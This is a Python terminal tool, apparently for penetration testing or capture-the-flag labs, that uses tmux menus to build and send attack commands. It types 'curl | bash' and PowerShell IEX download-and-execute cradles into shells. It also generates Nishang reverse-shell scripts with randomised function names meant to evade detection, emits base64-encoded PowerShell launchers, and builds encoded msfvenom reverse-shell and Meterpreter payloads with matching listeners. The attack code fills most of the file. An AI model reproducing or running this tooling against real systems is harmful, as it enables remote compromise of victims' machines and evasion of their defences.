#!/usr/bin/env python3

from simple_term_menu import TerminalMenu

import os
import string
import random
import base64
import sys
import dotenv

popup_mode = False

def get_ip(iface):
    cmd = f"ip a s {iface} | grep -Eo \'[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}\' | head -n 1"
    return os.popen(cmd).read().strip('\n')

def interfaces():
    cmd = 'ip l | grep -E \'^[[:digit:]]+: \' | cut -d \':\' -f 2'
    lines = os.popen(cmd).readlines()
    interfaces = [(x.strip('\n ')) for x in lines]
    ifaces = []
    for iface in interfaces:
        ifaces.append(iface + " " + get_ip(iface))
    tunInterfaces = [x for x in interfaces if str(x).startswith('tun')]
    if len(tunInterfaces) == 1: return tunInterfaces[0]
    print("Select interface.")
    menu = TerminalMenu(ifaces)
    index = menu.show()
    return interfaces[index].split(' ')[0]

def get_interface_ip():
    configIp = os.getenv('ATTACKER_IP')
    if configIp is not None: return configIp
    else: return get_ip(interfaces())

def strip_lines(lines):
    # return list(map(lambda x: x.strip('\n '), lines))
    return [l.strip('\n ') for l in lines]

def random_name(count):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(count))

def copy_to_tmux(text):
    os.system(f"echo -n {text} | tmux loadb -")

def select_pane():
    global popup_mode
    if popup_mode: # if we are running in popup mode, we can just get the current pane to send text to
        pane = os.popen("tmux list-panes | grep active").readline()
        pane = pane.split(' ')[-2]
        return pane
    else: # if we're running in a pane, then we have to ignore the current pane and select from the other panes
        panes = strip_lines(os.popen('tmux list-panes | grep -v active').readlines())
        def paneIndex(p): 
            return panes[p].split(' ')[-1]
        if len(panes) == 1: return paneIndex(0)
        else:
            print("Select pane.")
            index = TerminalMenu(panes).show()
            return paneIndex(index)

def copy_to_pane(text):
    pane = select_pane()
    os.system(f"tmux send-keys -t {pane} '{text}'")
    
def copy_to_menu(text):
    options = ["type in tmux pane", "copy to tmux buffer"]
    index = TerminalMenu(options).show()
    if index == 0: copy_to_pane(text)
    elif index == 1: copy_to_tmux(text)

def stabilize_shell():
    options = ['python3', 'python']
    # get tty size
    # tmux list-panes | grep active | cut -d '[' -f 2 | cut -d ']' -f 1
    if os.getenv('TTY_SIZE') is None:
        ttysize = os.popen("tmux list-panes | grep active | cut -d '[' -f 2 | cut -d ']' -f 1").readline().strip('\n')
    else:
        ttysize = os.getenv('TTY_SIZE') # format COLSxROWS
    [cols, rows] = ttysize.split('x')
    index = TerminalMenu(options).show()
    py = options[index]
    pane = select_pane()
    cmd = f"tmux send-keys -t {pane} {py} Space -c Space \\' 'import pty;pty.spawn(\"/bin/bash\")' \\' Enter"
    os.system(cmd)
    cmd = f"tmux send-keys -t {pane} C-z 'stty size' Enter 'stty raw -echo; fg; reset' Enter '' Enter 'stty rows {rows} cols {cols}' Enter 'export TERM=xterm-256color' Enter"
    os.system(cmd)

def get_apache_file(pattern):
    print("Choose file...")
    if pattern == '': cmd = "ls /var/www/html"
    else: cmd = f"ls /var/www/html | grep '{pattern}$'"
    files = strip_lines(os.popen(cmd).readlines())
    index = TerminalMenu(files).show()
    print(files[index])
    return files[index]

def get_temp_python_file(pattern):
    ip = get_interface_ip()
    pid, port = select_python_http()
    if pattern == '': cmd = f"ls /proc/{pid}/cwd"
    else: cmd = f"ls /proc/{pid}/cwd | grep '{pattern}$'"
    files = strip_lines(os.popen(cmd).readlines())
    if len(files) == 0:
        if len(pattern) > 0: print(f"No {pattern} files in python http dir /proc/{pid}/cwd")
        else: print(f"No files in python http dir /proc/{pid}/cwd")
        raise Exception("No files in python http directory" + input())
    index = TerminalMenu(files).show()
    filename = files[index]
    if int(port) != 80: url = f"http://{ip}:{port}/{filename}"
    else: url = f"http://{ip}/{filename}"
    return url, filename

def select_python_http():
    lines = os.popen("ps -ef | grep http.server | grep -v grep").readlines()
    pids = []
    ports = []
    options = []
    for l in lines:
        items = [x.strip('\n') for x in l.split(' ') if len(x) > 0]
        port = items[-1]
        pid = items[1]
        pids.append(pid)
        ports.append(port)
        options.append(f"PID {pid} Port {port}")
    if len(options) == 1: return pids[0], ports[0]
    elif len(options) == 0: raise Exception('No Python HTTP servers')
    else:
        print("Select Python HTTP Server")
        index = TerminalMenu(options).show()
        return pids[index], ports[index]

def is_python_http_running():
    cmd = "ps -ef | grep http.server | grep -v grep"
    output = os.popen(cmd).read()
    return len(output.strip('\n ')) > 0

def linux_menu():
    options = ["Stabilize shell", "wget a file", "curl file and pipe to bash"]
    index = TerminalMenu(options).show()
    print(options[index])
    def getUrl(fileExtension):
        if not is_python_http_running() or choose_apache_or_python(): # then use apache
            file = get_apache_file(fileExtension)
            return f"{ip}/{file}"
        else:
            url, _ = get_temp_python_file(fileExtension)
            return url
    if index == 0: stabilize_shell()
    elif index == 1 or index == 2:
        ip = get_interface_ip()
        if index == 1: # wget a file
            url = getUrl('')
            cmd = f"wget {url}"
        elif index == 2: # curl file and pipe to bash
            url = getUrl('.sh')
            cmd = f"curl {url} | bash"
        copy_to_pane(cmd)

def choose_apache_or_python():
    print("Get file from apache or temp python server?")
    index = TerminalMenu(["Apache, port 80", "Python HTTP"]).show()
    return index == 0

def copy_nishang(ip, port, directory, nishang_script):
    lines = open(nishang_script, 'r').readlines()
    randomName = random_name(8)
    functionName = 'Invoke-' + randomName
    filename = f"{randomName}.ps1"
    output = ''
    comment = False
    for l in lines:
        if l.startswith('<#'): # strip comments
            comment = True
        if l.startswith('function '):
            output += f"function {functionName}\n" # rename the invoke function so it's not as easy to detect
        elif not comment:
            output += l
        if l.startswith('#>'):
            comment = False
    output += '\n' + f"{functionName} -Reverse -IPAddress {ip} -Port {port}"

    f = open(directory + filename, 'w')
    f.write(output)
    f.close
    return filename

def nishang_shell_menu():
    if is_python_http_running():
        locate_script_cmd = 'locate nishang | grep Invoke-PowerShellTcp.ps1'
        nishang_scripts = strip_lines(os.popen(locate_script_cmd).readlines())
        if len(nishang_scripts) == 0:
            print("You need the nishang scripts.")
            print("sudo apt install nishang")
            print("sudo updatedb")
            input("Press any key to continue")
        nishang_script = nishang_scripts[0] 
        rev_shell_port = input("Enter port for nishang reverse shell to connect: ")
        pid, port = select_python_http()
        print(f"Server {pid} on port {port}")
        directory = f"/proc/{pid}/cwd/"
        ip = get_interface_ip()
        filename = copy_nishang(ip, rev_shell_port, directory, nishang_script)
        url = f"http://{ip}:{port}/{filename}"
        if int(port) == 80: url = f'http://{ip}/{filename}'

        pscommand = f"IEX(New-Object Net.WebClient).downloadString('{url}')"
        utf16 = pscommand.encode('utf-16le')
        base64enc = base64.b64encode(utf16).decode('latin1')
        temp = os.popen('mktemp').read().strip('\n')
        pane = select_pane()
        f = open(temp, 'w')
        f.write(f"""Nishang URL: {url}
Command: powershell -c "{pscommand}"
Encoded: powershell -Enc {base64enc}
        """)
        f.close()
        os.system(f"tmux split-window -v 'less {temp} && rm {temp}'")

def msfvenom_generate_menu(ip, directory):
    # select windows/linux
    options = ['windows', 'linux']
    index = TerminalMenu(options).show()
    platform = options[index]
    print(platform)
    
    # select shell or meterpreter
    options = ['shell', 'meterpreter']
    index = TerminalMenu(options).show()
    shellType = options[index]
    print(shellType)

    # select x86/x64
    options = ['x86', 'x64']
    index = TerminalMenu(options).show()
    arch = options[index]
    print(arch)

    if shellType == 'shell': sh = 'shell_'
    else:
        options = ['staged', 'unstaged']
        index = TerminalMenu(options).show()
        if index == 0: sh = 'meterpreter/'
        else: sh = 'meterpreter_'
    
    sh += 'reverse_tcp'
    
    if platform == 'windows' and arch == 'x86':    
        payload = f"{platform}/{sh}"
    else:
        payload = f"{platform}/{arch}/{sh}"

    print(f"Payload: {payload}")
    
    # enter revshell port
    port = input("Enter reverse shell port: ")

    # read format
    if platform == 'windows':
        options = ['exe','dll','asp','msi','psh','psh-cmd','vba','asp','aspx','aspx-exe']
    else:
        options = ['elf','elf-so']
    index = TerminalMenu(options).show()
    format = options[index]
    print(format)

    randomName = random_name(8)

    # if meterpreter, generate RC file as well to launch msfconsole with the right kind of multi/handler listener
    if shellType == 'meterpreter':
        filename = f"listen-{randomName}.rc"
        fullpath = f"{directory}{filename}"
        f = open(fullpath, 'w') # put in current working directory
        f.write(f"""use multi/handler
set payload {payload}
set lhost {ip}
set lport {port}
run
        """)
        f.close()
        print(f"Generated RC file: {filename}")
        print(f"Listener command: msfconsole -r {filename}")
    
    # select encoders or none, different ones for x86 and x64
    # if encoders are used, enter iterations
    #TODO: add more encoders
    options = ['None']
    if arch == 'x86':
        options.append('x86/shikata_ga_nai')
    elif arch == 'x64':
        options.append('x64/zutto_dekiru')
    print("Select encoder")
    index = TerminalMenu(options).show()
    print(f"Encoder {options[index]}")
    if index == 0: encoder = ''
    else: encoder = options[index]

    iterations = 0
    if len(encoder) > 0:
        iterations = int(input("Enter encoder iterations: "))
    
    filename = f"{directory}{randomName}.{format}"
    cmd = f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {format} -o {filename}"
    if len(encoder) > 0: cmd += f" -e {encoder} -i {iterations}"

    print(cmd)
    os.system(cmd)

def msfvenom_menu():
    ip = get_interface_ip()
    directory = ''
    if is_python_http_running():
        pid, _ = select_python_http()
        directory = f"/proc/{pid}/cwd/"
    msfvenom_generate_menu(ip, directory)
    main() # call the main menu after msfvenom generation

def windows_menu():
    options = ["PS wget outfile", "PS IEX download and run script", "DOS download HTTP", "Prepare nishang reverse shell"]
    index = TerminalMenu(options).show()
    print(options[index])
    if index in [0,1,2]:        
        def getUrl(fileSelector):
            if not is_python_http_running() or choose_apache_or_python(): # use apache
                file = get_apache_file(fileSelector)
                url = f"http://{ip}/{file}"
                return url, file
            else:
                return get_temp_python_file(fileSelector)
        
        ip = get_interface_ip()
        pane = select_pane()

        if index == 0:
            url, file = getUrl('')
            cmd = f"tmux send-keys -t {pane} 'wget '{url}' -outfile {file}'"
        elif index == 1:
            url, _ = getUrl('.ps1')
            cmd = f"tmux send-keys -t {pane} 'IEX(New-Object Net.WebClient).downloadString(' \\' '{url}' \\' ')'"
        elif index == 2: # DOS download HTTP
            url, file = getUrl('')
            cmd = f"tmux send-keys -t {pane} 'certutil.exe -urlcache -split -f \"{url}\" {file}'"
        os.system(cmd)
    elif index == 3:
        nishang_shell_menu()

def set_custom_ip(ip):
    configFile = dotenv.find_dotenv('.tmux-pwn-env')
    f = open(configFile, 'a')
    f.writelines([f"ATTACKER_IP={ip}"])
    f.close()

def clear_custom_ip():
    # file=$(mktemp); cat .tmux-pwn-env | grep -v ATTACKER_IP > $file; mv $file ./.tmux-pwn-env
    configFile = dotenv.find_dotenv('.tmux-pwn-env')
    os.system(f"file=$(mktemp); cat {configFile} | grep -v ATTACKER_IP > $file; mv $file {configFile}")

def main():
    global popup_mode
    # print(dotenv.find_dotenv('.tmux-pwn-env'))
    dotenv.load_dotenv('.tmux-pwn-env')
    popup_mode = True
    if len(sys.argv) >= 2:
        if sys.argv[1] == 'pane': 
            popup_mode = False
    os.system("pwd")
    options = ["Copy my IP", "Linux shell commands", "Windows shell commands", "Copy python HTTP", "MSFVenom", "Start apache", "Stop apache"]
    
    hasCustomIp = os.getenv('ATTACKER_IP') is not None
    if hasCustomIp: options.append('Remove Custom IP')
    else: options.append('Set Custom IP')

    index = TerminalMenu(options).show()
    print(options[index])
    if index == 0:
        copy_to_menu(get_interface_ip())
    elif index == 1:
        linux_menu()
    elif index == 2:
        windows_menu()
    elif index == 3:
        if is_python_http_running():
            url, _ = get_temp_python_file('')
            copy_to_pane(url)
        else:
            input("Start python http server and try again")
    elif index == 4:
        msfvenom_menu()
    elif index == 5:
        print("Starting apache... sudo required")
        os.system("sudo systemctl start apache2")
    elif index == 6:
        print("Stopping apache... sudo required")
        os.system("sudo systemctl stop apache2")
    elif index == 7: # custom IP
        if hasCustomIp: clear_custom_ip()
        else: set_custom_ip(input("Enter IP: "))

if __name__ == "__main__":
    main()

